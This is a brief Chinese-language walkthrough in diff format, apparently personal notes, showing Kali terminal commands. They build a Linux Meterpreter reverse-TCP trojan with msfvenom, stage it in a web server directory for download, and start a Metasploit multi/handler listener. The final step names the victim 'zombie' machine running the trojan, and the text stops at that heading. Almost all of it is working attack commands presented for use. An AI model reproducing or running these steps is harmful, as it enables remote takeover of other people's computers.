@@ -1,0 +1,15 @@
+1.制作木马
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=10.211.55.6 LPORT=4444 -b "\x00" -i 10 -f elf -o /var/www/html/laohe
+
+2.监听
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfconsole 
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload
+msf6 exploit(multi/handler) > run
+
+3.肉鸡执行木马
